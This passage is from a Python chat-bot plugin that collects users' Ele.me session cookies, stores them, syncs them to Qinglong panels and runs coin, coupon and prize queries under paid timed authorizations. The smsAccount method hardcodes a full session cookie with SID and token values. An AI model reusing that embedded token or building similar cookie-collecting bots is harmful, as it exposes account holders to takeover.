                    display = middleware.bucketGet(self.authorization.accountId_remark,accountId) if middleware.bucketGet(self.authorization.accountId_remark,accountId) else middleware.bucketGet(self.authorization.accountId_phone,accountId)
                    if elmuser.checkCookie():
                        elmuser.userInfo()
                        elmuser.queryCoinInfo()
                        replyMessage += f"{index+1}. 【{display}】{elmuser.todaycoin}\n"
                    else:
                        replyMessage += f'{index+1}. 【{display}】 账号已失效\n'
                self.sender.reply(replyMessage)
            elif select == '2':
                self.sender.reply('获取数据中，请稍等~')
                replyMessage = '总计乐园币:\n'
                for index,accountId in enumerate(allAccount):
                    cookie = middleware.bucketGet(self.authorization.accountId_Bucket,accountId)
                    elmuser = ELM(1,cookie)
                    # 获取备注
                    display = middleware.bucketGet(self.authorization.accountId_remark,accountId) if middleware.bucketGet(self.authorization.accountId_remark,accountId) else middleware.bucketGet(self.authorization.accountId_phone,accountId)
                    if elmuser.checkCookie():
                        elmuser.userInfo()
                        elmuser.queryAllCoin()
                        replyMessage += f"{index+1}. 【{display}】{elmuser.allcoin}\n"
                    else:
                        replyMessage += f'{index+1}. 【{display}】 账号已失效\n'
                self.sender.reply(replyMessage)
            elif select == '3':
                self.sender.reply('获取数据中，请稍等~')
                replyMessage = '云授权时间:\n'
                for index,accountId in enumerate(allAccount):
                    # 获取备注
                    display = middleware.bucketGet(self.authorization.accountId_remark,accountId) if middleware.bucketGet(self.authorization.accountId_remark,accountId) else middleware.bucketGet(self.authorization.accountId_phone,accountId)
                    authorizationTime = self.authorization.queryAuthorizationTime(accountId)
                    if '已过期' in authorizationTime or '未授权' in authorizationTime:
                        continue
                    else:
                        authorizationTime = f'{days_until(authorizationTime)}天'
                    replyMessage += f"{index+1}. 【{display}】{authorizationTime}\n"
                self.sender.reply(replyMessage)
            else:
                self.sender.reply('输入错误，自动退出程序')      

    # 解绑模块
    def delAccount(self):
        # 查询绑定账号
        allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
        else:
            replyMessage = '请选择要解绑的账号，多选用逗号隔开：(q退出)\n【0】全部\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n☁️云授权到期：{self.authorization.queryAuthorizationTime(i)}\n'
            select = self.session(replyMessage)
            if select is False:
                return
            select = re.split(r'[,，]', select)
            if '0' in select:
                for i in allAccount:
                    middleware.bucketDel(self.authorization.accountAuthorizationTime_Bucket,i)
                    self.authorization.delAuthorization(i)
                    self.sender.reply(f'账号：{i}，解绑成功')
            else:
                for i in select:
                    if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                        key = allAccount[int(i)-1]  
                        middleware.bucketDel(self.authorization.accountAuthorizationTime_Bucket,key)
                        self.authorization.delAuthorization(key)
                        self.sender.reply(f'账号：{key}，解绑成功')

    # 查询夺宝
    def queryDb(self):
        # 查询绑定账号
        if middleware.bucketGet(self.elmConfigBucket,'authorizeCheckbox') == 'true':
            allAccount = self.authorization.queryAllAccount()
        else:
            allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
            return
        else:
            replyMessage = '请选择要查询的账号，多选用逗号隔开：(q退出)\n【0】全部\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n'
            select = self.session(replyMessage)
            if select is False:
                return
            select = re.split(r'[,，]', select)
            if '0' in select:
                for i in allAccount:
                    cookie = middleware.bucketGet(self.authorization.accountId_Bucket,i)
                    self.sender.reply(f'☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n' + ELM(1,cookie).querySnatch())
            else:
                for i in select:
                    if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                        key = allAccount[int(i)-1]
                        cookie = middleware.bucketGet(self.authorization.accountId_Bucket,key)
                        self.sender.reply(f'☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,key)}\n' + ELM(1,cookie).querySnatch())
                    else:
                        self.sender.reply('输入错误，自动退出程序')

    # 授权检测前置模块
    def diffCk(self):
        if self.effectCk == [] and self.invalidAccountId == []:
            allAccount = middleware.bucketAllKeys(self.authorization.accountId_Bucket)
            for accountId in allAccount:
                cookie = middleware.bucketGet(self.authorization.accountId_Bucket,accountId)
                user = ELM(1,cookie)
                if user.checkCookie():
                    submit_ck(user.cookie.get('USERID'),'elm',cookie,'true')
                    self.effectCk.append(accountId)
                else:
                    self.invalidAccountId.append(accountId)
        return self.effectCk,self.invalidAccountId

    # 授权检测模块
    def authorizeCheck(self,authorizationType):
        start_time = datetime.now()  # 记录开始时间
        self.get_ql()
        if authorizationType == 'elmZL':
            self.envname = self.lybOwnEnv
            title = '=====📢饿了么助力授权通知====='
            self.authorization.accountAuthorizationTime_Bucket = 'chuan_elmZL_AuthorizationTime'
        elif authorizationType == 'elm':
            self.envname = 'elmck'
            title = '=====📢饿了么乐园币授权通知====='
            self.authorization.accountAuthorizationTime_Bucket = 'chuan_elm_AuthorizationTime'
        expiredAccountId = [] # 过期账号
        authorizedAccountId = [] # 授权账号
        unauthorizedAccountId = [] # 未授权账号
        # 获取所有账号
        allAccount = middleware.bucketAllKeys(self.authorization.accountId_Bucket)
        for accountId in allAccount:
            authorizationTime = self.authorization.queryAuthorizationTime(accountId)
            if '已过期' in authorizationTime:
                expiredAccountId.append(accountId)
            elif '未授权' in authorizationTime:
                unauthorizedAccountId.append(accountId)
            else:
                authorizedAccountId.append(accountId)
        self.effectCk, self.invalidAccountId = self.diffCk()
        # 移除未授权账号
        for index,i in enumerate(self.qlData[:]):
            ql = i['ql']
            data = i['data']
            for env in data:
                id = env.get('id')
                name = env.get('name')
                cookie = env.get('value')
                try:
                    userId = re.findall(r'USERID=(.*?);',cookie)[0]
                except:
                    continue
                if name == self.envname:
                    if userId not in authorizedAccountId:
                        ql.delete_env(id)
                        self.qlData[index]['data'].remove(env)
                        prinf(f'{userId}：{self.envname}未授权移除成功')
        # 添加新授权
        for accountId in authorizedAccountId:
            if accountId in self.invalidAccountId:
                self.submit_ql(accountId,middleware.bucketGet(self.authorization.accountId_Bucket,accountId),False)
            else:
                self.submit_ql(accountId,middleware.bucketGet(self.authorization.accountId_Bucket,accountId))

        end_time = datetime.now()  # 记录结束时间
        elapsed_time = end_time - start_time  # 计算运行时间
        total_seconds = elapsed_time.total_seconds()
        # 计算分钟和秒
        minutes = int(total_seconds // 60)
        seconds = int(total_seconds % 60)
        middleware.notifyMasters(f'''
{title}
总帐号：{len(allAccount)}
授权账号：{len(authorizedAccountId)}
未授权账号：{len(unauthorizedAccountId)}
授权过期账号：{len(expiredAccountId)}
CK失效账号：{len(self.invalidAccountId)}
检测耗时：{minutes}分{seconds}秒    
''')
        # 推送过期
        for accountId in expiredAccountId:
            for imtype in imtypeList:
                self.authorization.imtype = imtype.upper()
                self.authorization.accountId_userId_Bucket = f'chuan_{self.authorization.recordType}{self.authorization.imtype}'
                userId = middleware.bucketGet(self.authorization.accountId_userId_Bucket,accountId)
                authorizationText = middleware.bucketGet(self.elmConfigBucket,'authorizationText') if middleware.bucketGet(self.elmConfigBucket,'authorizationText') else '😭授权已过期\n📣取消通知请发送【elm解绑】\n📣续费请发送【elm续费】'
                if userId:
                    middleware.push(imtype,'',userId,'',f'{title}\n\n🆔用户ID：{accountId}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,accountId)}\n{authorizationText}')
        # 推送失效
        for accountId in self.invalidAccountId:
            if accountId in authorizedAccountId:
                if accountId in self.notify:
                    continue
                self.notify.append(accountId)
                for imtype in imtypeList:
                    self.authorization.imtype = imtype.upper()
                    self.authorization.accountId_userId_Bucket = f'chuan_{self.authorization.recordType}{self.authorization.imtype}'
                    userId = middleware.bucketGet(self.authorization.accountId_userId_Bucket,accountId)
                    expiredText = middleware.bucketGet(self.elmConfigBucket,'expiredText') if middleware.bucketGet(self.elmConfigBucket,'expiredText') else '😭账号已失效，请发送CK更新'
                    if userId:
                        middleware.push(imtype,'',userId,'',f'{title}\n\n🆔用户ID：{accountId}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,accountId)}\n{expiredText}')
        middleware.notifyMasters('插件【我不饿】提醒您：授权过期用户和CK失效用户推送完成✅')

    def dbCheck(self):
        middleware.notifyMasters('0元夺宝检测中...')
        ts = []
        # 获取所有账号
        allAccount = middleware.bucketAllKeys(self.authorization.accountAuthorizationTime_Bucket)
        for accountId in allAccount:
            authorizationTime = self.authorization.queryAuthorizationTime(accountId)
            if '已过期' in authorizationTime or '未授权' in authorizationTime:
                continue
            else:
                cookie = middleware.bucketGet(self.authorization.accountId_Bucket,accountId)
                elmUser = ELM(1,cookie)
                dbRes = elmUser.querySnatch()
                if dbRes == '账号已失效' or dbRes == '未查询到7天内的中奖记录':
                    continue
                else:
                    # 查询平台与qq
                    userId = ''
                    for imtype in imtypeList:
                        self.authorization.imtype = imtype.upper()
                        self.authorization.accountId_userId_Bucket = f'chuan_{self.authorization.recordType}{self.authorization.imtype}'
                        if middleware.bucketGet(self.authorization.accountId_userId_Bucket,accountId):
                            userId = middleware.bucketGet(self.authorization.accountId_userId_Bucket,accountId)
                            break
                if userId:
                    ts.append(f'平台：{imtype.upper()}（{userId}）\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,accountId)}\n{dbRes}')
        if ts:
            middleware.notifyMasters('\n'.join(f"{i + 1}. {item}" for i, item in enumerate(ts)))
        else:
            middleware.notifyMasters('很遗憾，七天内没有人中奖')

    def authorizeOne(self):
        self.sender.reply(f'请选择授权方式：(q退出)\n【1】指定账号授权\n【2】指定ck授权')
        select = self.sender.input(60*1000,0,False)
        if select == 'q' or select == 'Q':
            self.sender.reply('退出')
            return
        if select == '1':
            userId = self.session('请发送账号id，不知道请对机器人发送myuid')
            if userId is False:
                return
            # 确认该账号平台
            self.authorization.userId = ''
            for imtype in imtypeList:
                self.authorization.imtype = imtype.upper()
                self.authorization.accountId_userId_Bucket = f'chuan_{self.authorization.recordType}{self.authorization.imtype}'
                if middleware.bucketKeys(self.authorization.accountId_userId_Bucket,userId):
                    self.authorization.imtype = imtype
                    self.authorization.userId = userId
                    break
            
            if self.authorization.userId:
                allAccount = self.authorization.queryAllAccount(True,True)
                replyMessage = '请选择要授权的账号，多选用逗号隔开：(q退出)\n【0】全部\n'
                for index,i in enumerate(allAccount):
                    replyMessage += f'【{index+1}】{i}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n'
                    replyMessage += f'☁️云授权到期：{self.authorization.queryAuthorizationTime(i)}\n'
                    if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                        replyMessage += f"☁️助力授权到期：{Authorization(self.userId,self.imtype,'elmZL').queryAuthorizationTime(i)}\n"
                select = self.session(replyMessage)
                if select is False:
                    return
                select = re.split(r'[,，]', select)
                if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                    selectType = self.session('请选择需要授权的类型，回复【】内的阿拉伯数字即可(q退出)\n【1】：乐园币授权\n【2】：助力授权')
                    if selectType is False:
                        return
                    if selectType == '1':
                        self.authorization.accountAuthorizationTime_Bucket = f'chuan_elm_AuthorizationTime'
                    elif selectType == '2':
                        self.authorization.accountAuthorizationTime_Bucket = f'chuan_elmZL_AuthorizationTime'
                    else:
                        self.sender.reply('选择错误，退出')
                        return
                    if '0' in select:
                        self.authorizeAccount(allAccount,'day',True)
                    else:
                        keys = []
                        for i in select:
                            if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                                key = allAccount[int(i)-1]
                                keys.append(key)
                        self.authorizeAccount(keys,'day',True)
                else:
                    if '0' in select:
                        self.authorizeAccount(allAccount,'day',True)
                    else:
                        keys = []
                        for i in select:
                            if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                                key = allAccount[int(i)-1]
                                keys.append(key)
                        self.authorizeAccount(keys,'day',True)
            else:
                self.sender.reply('该账号未绑定任何CK')

        elif select == '2':
            cookie = self.session('请发送ck或者USERID')
            if cookie is False:
                return
            if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                selectType = self.session('请选择需要授权的类型，回复【】内的阿拉伯数字即可(q退出)\n【1】：乐园币授权\n【2】：助力授权')
                if selectType is False:
                    return
                if selectType == '1':
                    self.authorization = Authorization(self.userId,self.imtype,'elm')
                elif selectType == '2':
                    self.authorization = Authorization(self.userId,self.imtype,'elmZL')
                if len(cookie) > 20:
                    key = str2dict(cookie).get('USERID')
                    self.authorizeAccount(key,'day',True)
                else:
                    self.authorizeAccount(cookie,'day',True)
            else:
                if len(cookie) > 20:
                    key = str2dict(cookie).get('USERID')
                    self.authorizeAccount(key,'day',True)
                else:
                    self.authorizeAccount(cookie,'day',True)

    # 清理过期授权
    def delAllAccount(self):
        authorization = Authorization(self.userId,self.imtype,'elm')
        authorizationZL = Authorization(self.userId,self.imtype,'elmZL')
        # 获取所有账号
        allAccount = middleware.bucketAllKeys(self.authorization.accountId_Bucket)
        success = 0
        for accountId in allAccount:
            AuthorizationTime = authorization.queryAuthorizationTime(accountId)
            AuthorizationTimeZL = authorizationZL.queryAuthorizationTime(accountId)
            # 判断账号
            if AuthorizationTime in ['已过期','未授权'] and AuthorizationTimeZL in ['已过期','未授权']:
                # 删除授权时间
                middleware.bucketDel(authorization.accountAuthorizationTime_Bucket,accountId)
                success += 1
            elif AuthorizationTime in ['已过期','未授权']:
                # 删除授权时间
                middleware.bucketDel(authorization.accountAuthorizationTime_Bucket,accountId)
            elif AuthorizationTimeZL in ['已过期','未授权']:
                # 删除授权时间
                middleware.bucketDel(authorizationZL.accountAuthorizationTime_Bucket,accountId)

        if success == 0:
            middleware.notifyMasters(f'太棒了，没有授权过期的账号🎉')
        else:
            middleware.notifyMasters(f'插件【我不饿】提醒您：清理过期账号{success}个')

    # 备注账号
    def remarkAccount(self):
        # 查询绑定账号
        if middleware.bucketGet(self.elmConfigBucket,'authorizeCheckbox') == 'true':
            allAccount = self.authorization.queryAllAccount()
        else:
            allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
            return
        else:
            replyMessage = '请选择要备注的账号：(q退出)\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n'
            self.sender.reply(replyMessage)
            select = self.sender.input(60*1000,0,False)
            if select == 'q' or select == 'Q':
                self.sender.reply('退出')
                return
            if select:
                if is_positive_integer(select) and 0 < int(select) <= len(allAccount):
                    key = allAccount[int(select)-1]   
                    self.sender.reply('请输入你的备注：(q退出)')
                    remark = self.sender.input(60*1000,0,False)
                    if remark == 'q' or remark == 'Q':
                        self.sender.reply('退出')
                        return
                    if remark:
                        middleware.bucketSet(self.authorization.accountId_remark,key,remark)
                        self.submit_ql(key,middleware.bucketGet(self.authorization.accountId_Bucket,key))
                        self.sender.reply(f'设置成功，{key}备注：{remark}')
                    else:
                        self.sender.reply('输入超时，自动退出程序')
                else:
                    self.sender.reply('输入错误，自动退出程序')
            else:
                self.sender.reply('输入超时，自动退出程序')

    def couponAccount(self):
        # 查询绑定账号
        if middleware.bucketGet(self.elmConfigBucket,'authorizeCheckbox') == 'true':
            allAccount = self.authorization.queryAllAccount()
        else:
            allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
            return
        else:
            replyMessage = '请选择要查询的账号：(q退出)\n【0】全部\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n'
            select = self.session(replyMessage)
            if select is False:
                return
            select = re.split(r'[,，]', select)
            if '0' in select:
                for i in allAccount:
                    cookie = middleware.bucketGet(self.authorization.accountId_Bucket,i)
                    self.sender.reply(f'☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n' + ELM(1,cookie).queryCoupon())
            else:
                for i in select:
                    if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                        key = allAccount[int(i)-1]
                        cookie = middleware.bucketGet(self.authorization.accountId_Bucket,key)
                        self.sender.reply(f'☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,key)}\n' + ELM(1,cookie).queryCoupon())
                    else:
                        self.sender.reply('输入错误，自动退出程序')
    
    def smsAccount(self):
        phone = self.session('请发送需要登陆的手机号：(q退出)')
        if phone is False:
            return
        if len(phone) != 11:
            self.sender.reply('手机号格式错误，自动退出')
            return
        loginCk = 'cookie2=2f169b29d848f40305252fe6404fba24e;unb=2205041819743;USERID=0000;SID=MmYxNjliMjlkODQ4ZjQwMzA1MjUyZmU2NDA0ZmJhMjRlNPfXqlzwlqQcCLS3nO2WYQ==;token=1_idc_1_5610131b8d60e84961a2e79add12b5041c142af920cfd26ac45b98c573b52aefa36c8df1f7756e8523464f48508efb56a89a695b516ce7f004ae6f73003b4d17877355749fc82eac9e615d511c89ba3c18ed82f05b813abb690b842b0dd1851999be1b256a1fa3fce2d3301403b1842eaa7f3d0cb1faf71d8e775ce65ea99576;utdid=ZWnL0ZWQRF4DAM6pZ5nTzxXI;deviceId=sp1GttyxvVMB2WCr6aP7tl36q2__RC03X7QPXks5DhWtUyRX4KAYw2LD0qWpXERz;umt=B2YBzG5LPGzbWBKLrS3gOkXNn2hdsnLq'
        # 尝试获取原ck
        allAccount = self.authorization.queryAllAccount(True,True)
        for i in allAccount: 
            dis = phone[0:3] + '****' + phone[7:11]
            if dis == middleware.bucketGet(self.authorization.accountId_phone,i):
                loginCk = middleware.bucketGet(self.authorization.accountId_Bucket,i)
                break

        user = ELM(1,loginCk)
        if user.smssend(phone):
            code = self.session('短信发送成功，请输入验证码：(q退出)')
            if code is False:
                return
            loginRes = user.smslogin(phone,code)
            if loginRes == '需要验证':
                tokenUrl = self.session(f'请180s内复制下面链接到浏览器打开，验证成功后发送浏览器链接：\n{user.h5Url}',timeout=180)
                if tokenUrl is False:
                    return
                # 尝试获取token
                try:
                    token = tokenUrl.split('havana_iv_token=')[1].split('&')[0]
                    loginRes = user.mlogintokenlogin(token,'sms')
                except:
                    loginRes = '获取验证token失败'
            if loginRes is True:
                self.message = dict2str(user.cookie)
                self.recordAccount()
            else:
                self.sender.reply(loginRes)

    def syncql(self):
        middleware.notifyMasters(f'开始同步青龙CK到我不饿')
        # 获取青龙ck
        self.get_ql()
        for i in self.qlData:
            envs = i.get('data')
            for env in envs:
                name = env.get('name')
                cookie = env.get('value')
                if name == 'elmck':
                    submit_ck(str2dict(cookie).get('USERID'),'elm',cookie,'true')
                    middleware.bucketSet('chuan_elm_accountId',str2dict(cookie).get('USERID'),cookie)
        middleware.notifyMasters(f'同步完成')

    def main(self):
        if self.initializationParam() == False:
            return
        smsRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'smsRules'))
        queryRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'queryRules'))
        queryEasyRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'queryEasyRules'))
        queryInfoRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'queryInfoRules'))
        renewalRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'renewalRules'))
        delRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'delRules'))
        dbRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'dbRules'))
        cqRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'cqRules'))
        remarkRules = re.split(r'[,，]', middleware.bucketGet(self.elmConfigBucket,'remarkRules'))
        self.unauthorizationText  = middleware.bucketGet(self.elmConfigBucket,'unauthorizationText') if middleware.bucketGet(self.elmConfigBucket,'unauthorizationText') else '未查询到绑定账号，请发送饿了么ck登记绑定。'
        self.recordText  = middleware.bucketGet(self.elmConfigBucket,'recordText') if middleware.bucketGet(self.elmConfigBucket,'recordText') else '登记成功'

        if 'cookie2=' in self.message and 'SID=' in self.message and '40-20' not in self.message and '40-39' not in self.message and '18-18' not in self.message and '鲜花' not in self.message and '饿了么17' not in self.message and '56-56' not in self.message and '20-20' not in self.message:
            self.recordAccount()
        elif self.message in renewalRules:
            self.renewalAccount()
        elif self.message in queryEasyRules:
            self.queryAccountEasy()
        elif self.message in queryInfoRules:
            self.queryAccount(True)
        elif self.message in queryRules:
            self.queryAccount()
        elif self.message in delRules:
            self.delAccount()
        elif self.message in dbRules:
            self.queryDb()
        elif self.message in cqRules:
            self.couponAccount()
        elif self.message in remarkRules:
            self.remarkAccount()
        elif self.message in smsRules:
            self.smsAccount()
        elif '同步青龙' == self.message:
            self.syncql()
        elif 'elm授权' == self.message and self.sender.isAdmin():
            self.authorizeOne()
        elif '夺宝检测' == self.message and self.sender.isAdmin():
            self.dbCheck()
        elif 'elm清理授权' in self.message and self.sender.isAdmin():
            self.delAllAccount()
        elif 'elm授权检测' == self.message and self.sender.isAdmin():
            middleware.notifyMasters('插件【我不饿】提醒您：授权检测中~')
            self.authorizeCheck('elm')
            if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                self.authorizeCheck('elmZL')

if __name__ == "__main__":
    imtypeList = ['qq','qb','wx','wb','tb','tg']
    MAIN('elm').main()
    